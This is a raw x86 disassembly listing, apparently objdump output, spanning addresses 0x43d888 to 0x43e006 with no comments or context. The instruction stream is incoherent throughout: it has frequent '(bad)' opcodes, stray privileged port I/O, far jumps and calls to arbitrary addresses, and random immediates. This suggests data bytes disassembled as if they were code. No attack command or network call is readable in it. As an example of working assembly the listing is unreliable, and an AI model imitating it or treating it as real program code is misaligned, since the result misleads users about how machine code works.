  43d888:	mov    eax,0x22f4eced
  43d88d:	sub    BYTE PTR [edx],dh
  43d88f:	and    esi,DWORD PTR [ebp+0x6099b50a]
  43d895:	mov    ch,0x4f
  43d897:	add    eax,0x196b5be9
  43d89c:	jg     0x43d87b
  43d89e:	loopne 0x43d8ae
  43d8a0:	cld    
  43d8a1:	cmp    DWORD PTR [ecx+edx*1+0x24a30b30],esi
  43d8a8:	sub    BYTE PTR [esi-0x3fc95a39],0xe8
  43d8af:	sbb    BYTE PTR [esi],ch
  43d8b1:	xor    DWORD PTR [eax-0x17],ebx
  43d8b4:	push   ebx
  43d8b5:	pop    es
  43d8b6:	ret    
  43d8b7:	jae    0x43d84f
  43d8b9:	imul   edi,DWORD PTR [edx-0x12],0xffffff84
  43d8bd:	xor    bh,dl
  43d8bf:	xchg   esi,eax
  43d8c0:	enter  0xac1d,0xda
  43d8c4:	sti    
  43d8c5:	or     ah,dh
  43d8c7:	push   edi
  43d8c8:	outs   dx,DWORD PTR ss:[esi]
  43d8ca:	(bad)  
  43d8cb:	in     eax,dx
  43d8cc:	mov    ah,0xb8
  43d8ce:	ret    
  43d8cf:	cmp    esi,DWORD PTR [ebp-0xd]
  43d8d2:	cmp    BYTE PTR [esi],0xe4
  43d8d5:	and    ebp,DWORD PTR [edi-0x3e]
  43d8d8:	cmp    al,0x1c
  43d8da:	(bad)  
  43d8db:	into   
  43d8dc:	in     eax,0xfb
  43d8de:	stc    
  43d8df:	mov    esi,DWORD PTR [edx+esi*8-0x6e]
  43d8e3:	mov    dl,BYTE PTR [ebp-0x78b79cf0]
  43d8e9:	je     0x43d8dd
  43d8eb:	inc    eax
  43d8ec:	mov    bl,0x16
  43d8ee:	adc    cl,dl
  43d8f0:	hlt    
  43d8f1:	mov    dh,0x21
  43d8f3:	pop    ebp
  43d8f4:	(bad)  [edi-0x6048ba81]
  43d8fa:	retf   
  43d8fb:	inc    esi
  43d8fc:	jp     0x43d8ae
  43d8fe:	ret    0x81b
  43d901:	arpl   WORD PTR [ebp-0xa],cx
  43d904:	mov    eax,0x820fb0a4
  43d909:	add    esi,edx
  43d90b:	in     eax,dx
  43d90c:	jo     0x43d94f
  43d90e:	outs   dx,BYTE PTR ds:[esi]
  43d90f:	jp     0x43d8f1
  43d911:	mov    esp,0xba2273a3
  43d916:	(bad)  
  43d917:	adc    bl,BYTE PTR [esp+esi*8+0x30]
  43d91b:	jmp    0x1606b34c
  43d920:	retf   0xd967
  43d923:	jbe    0x43d96c
  43d925:	mov    eax,ds:0xc4b203a7
  43d92a:	out    dx,eax
  43d92b:	or     esi,DWORD PTR [ebx-0x54f8cd8c]
  43d931:	sub    eax,esi
  43d933:	bound  esp,QWORD PTR [edi]
  43d935:	ret    
  43d936:	jl     0x43d948
  43d938:	add    eax,0x566d4cde
  43d93d:	add    DWORD PTR [ebp+0xa],eax
  43d940:	fnsave [esi+0x60c61664]
  43d946:	(bad)  [edi-0xb2ba94f]
  43d94d:	out    0xa,eax
  43d94f:	pushf  
  43d950:	push   esp
  43d951:	mov    edi,0xea5ec1bb
  43d956:	cmp    BYTE PTR ds:0x3ba1de2b,bh
  43d95c:	ret    
  43d95d:	scas   al,BYTE PTR es:[edi]
  43d95e:	cmp    DWORD PTR [ecx-0x2f],esi
  43d961:	mov    dl,0xfc
  43d963:	dec    ebp
  43d964:	cmp    BYTE PTR [ebx+0x319a4a4d],ah
  43d96a:	and    esi,DWORD PTR [edi-0x60]
  43d96d:	ja     0x43d977
  43d96f:	pop    es
  43d970:	fst    QWORD PTR ds:0xa6411844
  43d976:	inc    ebp
  43d977:	fidiv  WORD PTR [ebx]
  43d979:	pop    esp
  43d97a:	push   es
  43d97b:	and    eax,0x622b2b2a
  43d980:	mov    DWORD PTR [edx-0x25],edi
  43d983:	sti    
  43d984:	xor    al,0xc2
  43d986:	call   0x6f05638f
  43d98b:	shl    DWORD PTR [edi],cl
  43d98d:	aaa    
  43d98e:	adc    ah,dl
  43d990:	ins    BYTE PTR es:[edi],dx
  43d991:	iret   
  43d992:	lock test BYTE PTR [esi-0x6b],dh
  43d996:	sub    eax,0xa2056e15
  43d99b:	xchg   ah,dh
  43d99d:	ss test eax,0x56a8e60
  43d9a3:	mov    bh,0x90
  43d9a5:	xor    BYTE PTR [ecx+0x79],ah
  43d9a8:	mov    esp,0x5154b9fb
  43d9ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d9ae:	pop    ds
  43d9af:	arpl   WORD PTR [edx+0x3e],di
  43d9b2:	imul   edi,DWORD PTR [ebx],0x1452f4be
  43d9b8:	fild   QWORD PTR [edi+0x57]
  43d9bb:	push   edi
  43d9bc:	mov    edi,DWORD PTR [ebp+0x45]
  43d9bf:	jmp    0xec8c:0x882fd40e
  43d9c6:	adc    cl,bl
  43d9c8:	add    eax,0x2c90004c
  43d9cd:	mov    esp,0xe68bd674
  43d9d2:	or     ebp,DWORD PTR [ebx]
  43d9d4:	aam    0x5
  43d9d6:	xchg   ebx,eax
  43d9d7:	call   0xea8fa12d
  43d9dc:	push   ebx
  43d9dd:	and    DWORD PTR [ebx+ebx*1+0x7f06bbd5],esi
  43d9e4:	inc    eax
  43d9e5:	loope  0x43da3c
  43d9e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d9e8:	sub    BYTE PTR [ebp+0x3c],dl
  43d9eb:	push   ecx
  43d9ec:	arpl   WORD PTR [esi-0x17],bx
  43d9ef:	mov    dh,BYTE PTR [edx-0x52]
  43d9f2:	pop    esp
  43d9f3:	xchg   edx,eax
  43d9f4:	and    al,0xf2
  43d9f6:	adc    BYTE PTR [ecx],bh
  43d9f8:	nop
  43d9f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d9fa:	push   esp
  43d9fb:	(bad)  
  43d9fc:	xlat   BYTE PTR ds:[ebx]
  43d9fd:	shl    BYTE PTR [ecx+0x28d8c11f],cl
  43da03:	(bad)  
  43da04:	imul   edx,DWORD PTR [esp+edi*2+0x15],0x4e
  43da09:	hlt    
  43da0a:	fist   WORD PTR [edi-0x73]
  43da0d:	loopne 0x43da3d
  43da0f:	xchg   ebx,eax
  43da10:	out    dx,al
  43da11:	dec    edi
  43da12:	mov    DWORD PTR [ebx-0x12],esp
  43da15:	out    dx,eax
  43da16:	jns    0x43da79
  43da18:	mov    WORD PTR [edi],fs
  43da1a:	mov    ebx,0x82be469e
  43da1f:	jmp    0x913bbc07
  43da24:	dec    ebx
  43da25:	dec    edx
  43da26:	inc    ebp
  43da27:	ins    BYTE PTR es:[edi],dx
  43da28:	mov    ecx,0x74574045
  43da2d:	pop    es
  43da2e:	shl    DWORD PTR [edx+0x405b6808],0x1e
  43da35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43da36:	jp     0x43da08
  43da38:	iret   
  43da39:	push   esp
  43da3a:	add    BYTE PTR [ecx-0x403ef234],bl
  43da40:	fsubr  st,st(5)
  43da42:	test   al,0xfe
  43da44:	call   0x18ddff1a
  43da49:	sub    edx,edx
  43da4b:	retf   
  43da4c:	lods   al,BYTE PTR ds:[esi]
  43da4d:	jle    0x43dab0
  43da4f:	fld    QWORD PTR [edx]
  43da51:	pop    ebp
  43da52:	lea    edi,[esi+0xd0507b1]
  43da58:	cmp    al,0xc4
  43da5a:	add    dl,bl
  43da5c:	data16 fbld TBYTE PTR [ecx-0x51dd96a6]
  43da63:	and    DWORD PTR [esi+0x3],esi
  43da66:	jmp    0x43da09
  43da68:	mov    al,0xf7
  43da6a:	xchg   ebp,eax
  43da6b:	stc    
  43da6c:	jo     0x43d9ef
  43da6e:	addr16 push edx
  43da70:	pop    ecx
  43da71:	dec    ebp
  43da72:	sahf   
  43da73:	push   ebp
  43da74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43da75:	sub    BYTE PTR [eax-0x23],al
  43da78:	jl     0x43da4b
  43da7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43da7b:	shl    DWORD PTR [ebx],0x31
  43da7e:	and    eax,esi
  43da80:	add    dl,BYTE PTR [ecx-0x7dd8e556]
  43da86:	dec    ebx
  43da87:	daa    
  43da88:	mov    al,0x56
  43da8a:	inc    esp
  43da8b:	inc    esp
  43da8c:	pop    ebx
  43da8d:	jl     0x43da55
  43da8f:	jecxz  0x43da8e
  43da91:	nop    DWORD PTR [eax]
  43da94:	enter  0xdcc3,0x65
  43da98:	pop    ds
  43da99:	jge    0x43da76
  43da9b:	jmp    0x5816:0x8167bad0
  43daa2:	mov    al,0xa0
  43daa4:	inc    edi
  43daa5:	icebp  
  43daa6:	jp     0x43daf4
  43daa8:	sbb    eax,0x16fbcfc3
  43daad:	cmp    edi,ebx
  43daaf:	test   esi,edi
  43dab1:	inc    ebx
  43dab2:	or     DWORD PTR [ebp-0x45c80cac],0xbd638202
  43dabc:	jmp    0x7325:0xe127b348
  43dac3:	cmp    al,0xde
  43dac5:	aaa    
  43dac6:	call   0xcd18:0xeb81a968
  43dacd:	mov    dl,0x97
  43dacf:	lahf   
  43dad0:	push   ds
  43dad1:	fist   DWORD PTR [eax+0x15]
  43dad4:	fnstsw WORD PTR [eax-0x2cb45a0e]
  43dada:	xor    al,0x1a
  43dadc:	and    al,0xdb
  43dade:	mov    ecx,0xcc38a0d3
  43dae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dae4:	cwde   
  43dae5:	imul   edx,DWORD PTR [ecx],0x2f
  43dae8:	push   0x7e
  43daea:	in     eax,0x53
  43daec:	addr16 push 0x24
  43daef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43daf0:	or     eax,0xbf36d0b
  43daf5:	std    
  43daf6:	(bad)  
  43daf7:	jns    0x43db40
  43daf9:	push   0xffffffde
  43dafb:	scas   al,BYTE PTR es:[edi]
  43dafc:	sar    DWORD PTR [ebx+0x9],0x95
  43db00:	sub    cl,BYTE PTR [edx+0x39]
  43db03:	add    BYTE PTR [edx+0xf87f230],dl
  43db09:	inc    ebp
  43db0a:	adc    al,BYTE PTR [ecx+0x59c7020e]
  43db10:	mov    dl,0x6b
  43db12:	cmp    DWORD PTR [ebx+0x3b],eax
  43db15:	(bad)  
  43db16:	call   eax
  43db18:	sub    DWORD PTR [ecx],edx
  43db1a:	mov    ds:0x12f925c1,eax
  43db1f:	mov    ah,dl
  43db21:	pop    edx
  43db22:	xor    esi,DWORD PTR [ecx+0x38]
  43db25:	cmc    
  43db26:	repnz sub al,BYTE PTR [ebx-0x36380ddd]
  43db2d:	xor    eax,0x99ee0421
  43db32:	out    0x9c,al
  43db34:	outs   dx,BYTE PTR ds:[esi]
  43db35:	pop    ds
  43db36:	mov    eax,DWORD PTR [ebx+0x5c4d5144]
  43db3c:	sbb    ch,BYTE PTR [ebx]
  43db3e:	sbb    DWORD PTR [ecx+0x53c021c1],esp
  43db44:	dec    eax
  43db45:	mov    bh,0xb0
  43db47:	add    ecx,DWORD PTR [ebp-0x18]
  43db4a:	lds    edi,FWORD PTR [edi]
  43db4c:	push   eax
  43db4d:	popf   
  43db4e:	sub    DWORD PTR [esi+ebp*8+0x6d00c346],ebp
  43db55:	in     eax,0x2
  43db57:	les    esp,FWORD PTR [esi+0xfb79f17]
  43db5d:	iret   
  43db5e:	inc    ecx
  43db5f:	dec    ecx
  43db60:	call   0xfbbad24a
  43db65:	aad    0xc2
  43db67:	cmp    al,BYTE PTR [ebx]
  43db69:	push   cs
  43db6a:	stos   DWORD PTR es:[edi],eax
  43db6b:	int    0x3b
  43db6d:	inc    esi
  43db6e:	cmp    ebx,edi
  43db70:	mov    esp,DWORD PTR [ebx]
  43db72:	mov    eax,ds:0xf2029e11
  43db77:	and    edx,ebp
  43db79:	sbb    eax,0x12aed301
  43db7e:	fst    QWORD PTR [eax-0x14]
  43db81:	push   ds
  43db82:	dec    esp
  43db83:	add    eax,0x18b19c14
  43db88:	push   cs
  43db89:	jge    0x43dbe1
  43db8b:	mov    eax,ds:0xbeeeedee
  43db90:	add    esp,DWORD PTR [ecx-0x384f5919]
  43db96:	inc    edx
  43db97:	push   0xf225ad2a
  43db9c:	popa   
  43db9d:	in     al,0x63
  43db9f:	mov    bh,0xc5
  43dba1:	mov    eax,ds:0x2b2a0ee1
  43dba6:	or     DWORD PTR [esp+eax*4-0x3a],eax
  43dbaa:	mov    dh,0xa9
  43dbac:	retf   
  43dbad:	bound  esp,QWORD PTR [ecx+0x30]
  43dbb0:	adc    BYTE PTR [ebp*1-0x270256fa],dl
  43dbb7:	or     edx,ebx
  43dbb9:	pop    ds
  43dbba:	dec    ecx
  43dbbb:	pop    ss
  43dbbc:	dec    eax
  43dbbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dbbe:	mov    esp,0xdcaf742d
  43dbc3:	xchg   ecx,eax
  43dbc4:	pop    es
  43dbc5:	xchg   edi,eax
  43dbc6:	sub    DWORD PTR [edi],eax
  43dbc8:	js     0x43dc26
  43dbca:	jb     0x43dbfe
  43dbcc:	dec    eax
  43dbcd:	fiadd  DWORD PTR [edi+0x4f87f35b]
  43dbd3:	fs enter 0xcde7,0xc3
  43dbd8:	push   esp
  43dbd9:	add    BYTE PTR [edx],cl
  43dbdb:	popa   
  43dbdc:	arpl   WORD PTR [ebp+eiz*1+0x6fe73399],bp
  43dbe3:	xchg   esp,eax
  43dbe4:	out    dx,al
  43dbe5:	mov    cl,BYTE PTR [eax+0x50]
  43dbe8:	retf   
  43dbe9:	lds    ebp,FWORD PTR [ebp+0x13af4878]
  43dbef:	rcr    edi,1
  43dbf1:	push   esi
  43dbf2:	mov    bh,0x45
  43dbf4:	push   edi
  43dbf5:	fld    QWORD PTR [ebp-0x6eb9b35]
  43dbfb:	sub    al,BYTE PTR [ebx]
  43dbfd:	push   es
  43dbfe:	aas    
  43dbff:	jno    0x43dc3c
  43dc01:	fldz   
  43dc03:	jmp    0x1a7a26d9
  43dc08:	or     ebp,DWORD PTR [edi+0x2a]
  43dc0b:	inc    ebp
  43dc0c:	add    esp,DWORD PTR [ebx-0x44c5f6a2]
  43dc12:	fwait
  43dc13:	call   0xf53ba4c5
  43dc18:	(bad)  
  43dc19:	call   0x2a964369
  43dc1e:	fbld   TBYTE PTR ds:[edx+0x24]
  43dc22:	fcom   st(1)
  43dc24:	pop    ss
  43dc25:	mov    ecx,0xfae26288
  43dc2a:	lahf   
  43dc2b:	enter  0x7c2b,0xa6
  43dc2f:	sub    BYTE PTR [edi],cl
  43dc31:	popa   
  43dc32:	sub    eax,0xc0639f36
  43dc37:	loope  0x43dc70
  43dc39:	push   ebp
  43dc3a:	xchg   ebp,eax
  43dc3b:	or     edx,esi
  43dc3d:	lds    esi,FWORD PTR [edi+edx*1]
  43dc40:	jmp    0x157a0a1e
  43dc45:	and    ch,ch
  43dc47:	int    0x57
  43dc49:	loope  0x43dc78
  43dc4b:	hlt    
  43dc4c:	ss (bad) 
  43dc4e:	jecxz  0x43dc74
  43dc50:	push   ebx
  43dc51:	scas   eax,DWORD PTR es:[edi]
  43dc52:	mov    bh,0x55
  43dc54:	aam    0xaa
  43dc56:	add    ebp,DWORD PTR [edx-0x56aecee2]
  43dc5c:	pusha  
  43dc5d:	pop    ebx
  43dc5e:	xor    al,0xc6
  43dc60:	imul   eax,DWORD PTR [ebx+esi*2-0x77],0x7f773f32
  43dc68:	cld    
  43dc69:	sar    DWORD PTR [ebp-0xd],cl
  43dc6c:	inc    si
  43dc6e:	cmp    ah,BYTE PTR [edi+0x1389a1ae]
  43dc74:	inc    ebx
  43dc75:	push   cs
  43dc76:	dec    edi
  43dc77:	pop    ebx
  43dc78:	or     dh,BYTE PTR [esi+0x5b]
  43dc7b:	cmp    BYTE PTR [eax+0x7b17f21f],cl
  43dc81:	push   0x4d
  43dc83:	call   0x3603a96a
  43dc88:	and    DWORD PTR [edx+0x10],0x34
  43dc8c:	lods   eax,DWORD PTR ds:[esi]
  43dc8d:	cmp    DWORD PTR [edi],ebp
  43dc8f:	retf   
  43dc90:	call   0xf1cc:0x267890df
  43dc97:	mov    ebp,0xc24435b7
  43dc9c:	xchg   esi,eax
  43dc9d:	pop    esp
  43dc9e:	mov    edx,0xac2360b5
  43dca3:	sub    DWORD PTR [edx+0x6bf9d63f],0x5e9c11cb
  43dcad:	or     DWORD PTR [ecx],ebx
  43dcaf:	hlt    
  43dcb0:	inc    edx
  43dcb1:	(bad)  
  43dcb2:	cmp    esp,ecx
  43dcb4:	imul   esp,esp,0x41
  43dcb7:	sbb    al,0xce
  43dcb9:	inc    esp
  43dcba:	xor    esp,DWORD PTR [eax]
  43dcbc:	in     al,0xd9
  43dcbe:	in     eax,dx
  43dcbf:	rcr    BYTE PTR [esi+0x6d0a2987],cl
  43dcc5:	jg     0x43dcca
  43dcc7:	mov    bh,0x6d
  43dcc9:	addr16 push ecx
  43dccb:	jne    0x43dc78
  43dccd:	jne    0x43dc91
  43dccf:	retf   0x771d
  43dcd2:	enter  0xda39,0x83
  43dcd6:	das    
  43dcd7:	sbb    al,0xdd
  43dcd9:	mov    esp,0x2806e4f5
  43dcde:	mov    al,0xa4
  43dce0:	pop    ecx
  43dce1:	pop    es
  43dce2:	xchg   esp,eax
  43dce3:	adc    BYTE PTR [edx-0x52814e7],0x3f
  43dcea:	mov    WORD PTR [edx-0x1f828622],ds
  43dcf0:	mov    eax,ds:0x9925b575
  43dcf5:	das    
  43dcf6:	add    DWORD PTR [edi+0x25],0x5d
  43dcfa:	jp     0x43dcb1
  43dcfc:	jmp    0x43dce4
  43dcfe:	fcomp  DWORD PTR [edi+0x64ad2646]
  43dd04:	popa   
  43dd05:	stc    
  43dd06:	pop    esp
  43dd07:	adc    eax,0xfee13ebb
  43dd0c:	and    DWORD PTR [ebp-0x13],ebx
  43dd0f:	ror    BYTE PTR [eax+0x25],1
  43dd12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dd13:	repz cmp BYTE PTR [edi-0x10bb9512],bh
  43dd1a:	hlt    
  43dd1b:	ret    
  43dd1c:	ss out dx,eax
  43dd1e:	push   esi
  43dd1f:	stc    
  43dd20:	cdq    
  43dd21:	xchg   esp,eax
  43dd22:	adc    al,0x5c
  43dd24:	push   ss
  43dd25:	nop
  43dd26:	mov    dl,0xc9
  43dd28:	xchg   ebp,eax
  43dd29:	arpl   WORD PTR [ebx-0x55eb88ea],si
  43dd2f:	sbb    ebx,DWORD PTR [edx+0xcf21e26]
  43dd35:	aas    
  43dd36:	sar    BYTE PTR [edi-0xb],1
  43dd39:	push   es
  43dd3a:	in     al,dx
  43dd3b:	inc    ebx
  43dd3c:	pop    eax
  43dd3d:	test   al,0xef
  43dd3f:	out    0x32,al
  43dd41:	xchg   ecx,eax
  43dd42:	mov    edx,0x7289c05f
  43dd47:	or     cl,BYTE PTR [ecx]
  43dd49:	and    eax,0xd5c85b8
  43dd4e:	pop    es
  43dd4f:	mov    ecx,DWORD PTR [edx+0x67]
  43dd52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dd53:	cwde   
  43dd54:	popf   
  43dd55:	add    edi,eax
  43dd57:	es loopne 0x43dd75
  43dd5a:	shl    BYTE PTR [esi+0x26],cl
  43dd5d:	jmp    0x2a24:0xf480d49f
  43dd64:	push   es
  43dd65:	test   BYTE PTR [edx+0x10],bl
  43dd68:	push   ss
  43dd69:	lods   eax,DWORD PTR ds:[esi]
  43dd6a:	iret   
  43dd6b:	jl     0x43ddb2
  43dd6d:	jmp    0xde60:0x8a62df68
  43dd74:	stc    
  43dd75:	sbb    DWORD PTR [edi],0x3d
  43dd78:	add    ecx,eax
  43dd7a:	sbb    dl,dl
  43dd7c:	and    DWORD PTR [esi-0x10],esp
  43dd7f:	jbe    0x43ddc2
  43dd81:	mov    edi,0xfe484c84
  43dd86:	(bad)  
  43dd87:	in     al,dx
  43dd88:	lahf   
  43dd89:	or     al,0x75
  43dd8b:	xor    DWORD PTR [eax+0x14530575],esp
  43dd91:	out    dx,al
  43dd92:	imul   esp,esp,0xffffffb8
  43dd95:	adc    edi,esp
  43dd97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dd98:	mov    eax,ds:0x3bc10df6
  43dd9d:	adc    ch,BYTE PTR [edx+0x46f35749]
  43dda3:	sahf   
  43dda4:	test   DWORD PTR [edi+0x30],eax
  43dda7:	push   edi
  43dda8:	sub    BYTE PTR [edx+0x4a],ah
  43ddab:	std    
  43ddac:	mov    esp,0xfcda229a
  43ddb1:	mul    ebx
  43ddb3:	inc    edx
  43ddb4:	pop    ss
  43ddb5:	mov    al,ds:0xec6e95b9
  43ddba:	adc    dh,BYTE PTR [edi]
  43ddbc:	mov    al,ds:0x7de674e5
  43ddc1:	in     eax,dx
  43ddc2:	push   ds
  43ddc3:	xor    eax,0x5f84e778
  43ddc8:	push   eax
  43ddc9:	inc    ebp
  43ddca:	jge    0x43dd7f
  43ddcc:	xlat   BYTE PTR ds:[ebx]
  43ddcd:	mov    edx,0xf74e22d
  43ddd2:	and    edx,edi
  43ddd4:	cmp    eax,0xcbc7d74d
  43ddd9:	fdiv   QWORD PTR [ebp*2+0x474cb883]
  43dde0:	addr16 aam 0x76
  43dde3:	in     eax,dx
  43dde4:	arpl   WORD PTR [ebx+0x39],ax
  43dde7:	cmp    eax,0x20072d49
  43ddec:	fstp   st(7)
  43ddee:	scas   eax,DWORD PTR es:[edi]
  43ddef:	xor    ebp,DWORD PTR [edi-0x56eb308]
  43ddf5:	lods   al,BYTE PTR ds:[esi]
  43ddf6:	dec    ebx
  43ddf7:	sbb    eax,0x6fc50b6a
  43ddfc:	shl    DWORD PTR [esp+ecx*4+0x52],1
  43de00:	outs   dx,DWORD PTR ds:[esi]
  43de01:	in     eax,dx
  43de02:	pop    ecx
  43de03:	dec    eax
  43de04:	je     0x43de13
  43de06:	lods   eax,DWORD PTR ds:[esi]
  43de07:	rcl    DWORD PTR [ebp-0x24],0x6e
  43de0b:	pop    ebx
  43de0c:	cmp    al,0x1d
  43de0e:	cmp    ah,BYTE PTR [edi+0x5b]
  43de11:	pop    ebp
  43de12:	adc    eax,0x3186c729
  43de17:	push   ecx
  43de18:	mov    esi,0x2a63a457
  43de1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43de1e:	push   edx
  43de1f:	cmc    
  43de20:	sbb    BYTE PTR [edi+0x5a],cl
  43de23:	out    0xa4,al
  43de25:	jbe    0x43de30
  43de27:	jbe    0x43de9b
  43de29:	inc    ebx
  43de2a:	les    edx,FWORD PTR [edi+0x2df95db]
  43de30:	adc    edi,DWORD PTR [ebp+0x3fbd3886]
  43de36:	inc    BYTE PTR [eax]
  43de38:	xchg   esp,eax
  43de39:	cmc    
  43de3a:	int    0xa
  43de3c:	add    dh,BYTE PTR [ebx+0x19]
  43de3f:	(bad)  
  43de40:	add    eax,0xb6f83a3c
  43de45:	out    0xd3,eax
  43de47:	and    eax,esi
  43de49:	dec    esp
  43de4a:	and    al,0x19
  43de4c:	pop    edx
  43de4d:	shl    ebp,0xac
  43de50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43de51:	out    dx,eax
  43de52:	nop
  43de53:	xor    al,0x3
  43de55:	add    al,0x68
  43de57:	in     eax,0x9d
  43de59:	dec    ebp
  43de5a:	xor    ebx,eax
  43de5c:	mov    esi,0xd08aa68e
  43de61:	push   ebp
  43de62:	push   edx
  43de63:	push   ecx
  43de64:	mov    ebx,0xc3b8fe90
  43de69:	xchg   esi,eax
  43de6a:	call   0x8d2a:0x189a7e7
  43de71:	add    ah,BYTE PTR [eax]
  43de73:	in     al,dx
  43de74:	div    bh
  43de76:	add    eax,0xb4f09c30
  43de7b:	ins    BYTE PTR es:[edi],dx
  43de7c:	dec    esp
  43de7d:	daa    
  43de7e:	sahf   
  43de7f:	sub    eax,0x968fa96f
  43de84:	pop    edx
  43de85:	pop    es
  43de86:	inc    eax
  43de87:	mov    dh,0xdc
  43de89:	dec    eax
  43de8a:	sbb    DWORD PTR [esi-0x7a9762a6],edx
  43de90:	loopne 0x43de21
  43de92:	daa    
  43de93:	inc    eax
  43de94:	es loope 0x43dee0
  43de97:	mov    ch,0x8
  43de99:	in     eax,dx
  43de9a:	jecxz  0x43dea3
  43de9c:	sub    al,0x6e
  43de9e:	mov    ebp,0xd00f7ce9
  43dea3:	sub    esi,DWORD PTR [eax]
  43dea5:	mov    esp,0x5906e5e1
  43deaa:	stc    
  43deab:	nop
  43deac:	xor    eax,DWORD PTR [edx-0x56]
  43deaf:	cmp    cl,BYTE PTR [ebp+0x54]
  43deb2:	jmp    0x43df33
  43deb4:	pop    ebx
  43deb5:	pop    bp
  43deb7:	mov    esi,DWORD PTR ds:0x7f6326c8
  43debd:	aas    
  43debe:	add    BYTE PTR [esi-0x77be81cc],ch
  43dec4:	mov    ax,0x24f3
  43dec8:	xchg   BYTE PTR [ecx],ah
  43deca:	or     ch,BYTE PTR [eax]
  43decc:	bound  eax,QWORD PTR [ebp-0x23763440]
  43ded2:	jge    0x43df21
  43ded4:	(bad)  
  43ded5:	adc    DWORD PTR [ecx+0x1e],ecx
  43ded8:	cmc    
  43ded9:	mov    al,0xcd
  43dedb:	icebp  
  43dedc:	adc    ch,ah
  43dede:	cmp    BYTE PTR [ebp-0x25],0x51
  43dee2:	mov    ebx,0xc840aa9f
  43dee7:	adc    DWORD PTR [ecx],esi
  43dee9:	pop    esp
  43deea:	push   ebp
  43deeb:	pop    esp
  43deec:	js     0x43de97
  43deee:	jmp    0xe582ad18
  43def3:	div    DWORD PTR [edi+0xcb0d114]
  43def9:	test   DWORD PTR [edx],0x5bac24bb
  43deff:	xchg   esp,eax
  43df00:	sub    ecx,ebp
  43df02:	inc    ebx
  43df03:	into   
  43df04:	mov    bl,0x31
  43df06:	rcr    BYTE PTR [ebp+0x55],0xc9
  43df0a:	pop    esp
  43df0b:	bound  ebx,QWORD PTR [edi+0x35357c47]
  43df11:	bound  esp,QWORD PTR [esi]
  43df13:	retf   
  43df14:	or     cl,BYTE PTR [edi+0x5f]
  43df17:	mov    ch,0xaf
  43df19:	arpl   ax,si
  43df1b:	pop    ebx
  43df1c:	out    0xed,al
  43df1e:	loopne 0x43df09
  43df20:	cmp    dl,ah
  43df22:	jecxz  0x43def0
  43df24:	or     eax,0xdf4c8018
  43df29:	outs   dx,DWORD PTR ds:[esi]
  43df2a:	call   0xf790:0x9402c3c6
  43df31:	xor    al,0xa7
  43df33:	sbb    BYTE PTR [edi-0x32],dl
  43df36:	ds in  al,dx
  43df38:	ja     0x43dec4
  43df3a:	pusha  
  43df3b:	pushf  
  43df3c:	outs   dx,DWORD PTR ds:[esi]
  43df3d:	leave  
  43df3e:	xchg   ecx,eax
  43df3f:	mov    dl,0x42
  43df41:	sub    al,0x83
  43df43:	fdivr  DWORD PTR [edi-0x4eab9627]
  43df49:	sub    BYTE PTR [ecx],cl
  43df4b:	push   0x2fd763fe
  43df50:	jp     0x43df08
  43df52:	aad    0x19
  43df54:	bound  edi,QWORD PTR ds:0x66ea7495
  43df5a:	jo     0x43dfb4
  43df5c:	mov    ebx,0x9f065a3c
  43df61:	cmp    eax,0x26c1f15e
  43df66:	ins    BYTE PTR es:[edi],dx
  43df67:	lea    edi,[eax]
  43df69:	test   DWORD PTR [edx],ebp
  43df6b:	icebp  
  43df6c:	leave  
  43df6d:	xor    al,0x96
  43df6f:	repnz inc eax
  43df71:	jb     0x43df04
  43df73:	push   ecx
  43df74:	mov    edx,0x74d099d2
  43df79:	inc    edi
  43df7a:	xor    bh,bl
  43df7c:	ret    
  43df7d:	nop
  43df7e:	ss sub al,0xbf
  43df81:	aam    0xb3
  43df83:	pop    esp
  43df84:	sbb    bl,dh
  43df86:	out    0x3b,eax
  43df88:	cmp    al,0xa1
  43df8a:	int    0x5a
  43df8c:	xor    edx,edx
  43df8e:	xor    al,0xeb
  43df90:	pop    es
  43df91:	inc    esi
  43df92:	ror    DWORD PTR [eax+0x14a5521e],1
  43df98:	dec    ebx
  43df99:	inc    esi
  43df9a:	div    WORD PTR [esi-0x67526c09]
  43dfa1:	mov    ecx,0xf085b76a
  43dfa6:	ins    BYTE PTR es:[edi],dx
  43dfa7:	mov    dh,0x51
  43dfa9:	shr    DWORD PTR [ebx+0x4c],0xc8
  43dfad:	lods   eax,DWORD PTR ds:[esi]
  43dfae:	mov    ds:0xadab5634,al
  43dfb3:	int    0xc3
  43dfb5:	outs   dx,BYTE PTR ds:[esi]
  43dfb6:	sbb    cl,BYTE PTR [eax]
  43dfb8:	pop    ss
  43dfb9:	and    edi,edi
  43dfbb:	mov    al,0x85
  43dfbd:	jl     0x43dfe0
  43dfbf:	cmp    DWORD PTR [ebx+0x1dde33e7],esi
  43dfc5:	inc    esi
  43dfc6:	ficomp DWORD PTR fs:[edx+ecx*8+0x38715c06]
  43dfce:	(bad)  
  43dfcf:	jmp    0x537249fb
  43dfd4:	fsincos 
  43dfd6:	sub    al,BYTE PTR [eax]
  43dfd8:	mov    DWORD PTR [ebx],edi
  43dfda:	inc    ebx
  43dfdb:	std    
  43dfdc:	pop    ebx
  43dfdd:	sub    dh,cl
  43dfdf:	lea    esi,[ebx-0x80]
  43dfe2:	arpl   si,bp
  43dfe4:	add    al,BYTE PTR [edi+0x156a8c5]
  43dfea:	mov    ds:0xf5244f3c,eax
  43dfef:	xchg   DWORD PTR [ecx+0x15454094],ebx
  43dff5:	xchg   dl,dl
  43dff7:	je     0x43df98
  43dff9:	push   esp
  43dffa:	mov    ss,WORD PTR [esi]
  43dffc:	and    eax,0x289b520c
  43e001:	dec    esi
  43e002:	jg     0x43dfc0
  43e004:	jnp    0x43e085
  43e006:	fnsave [ebx-0x70464689]
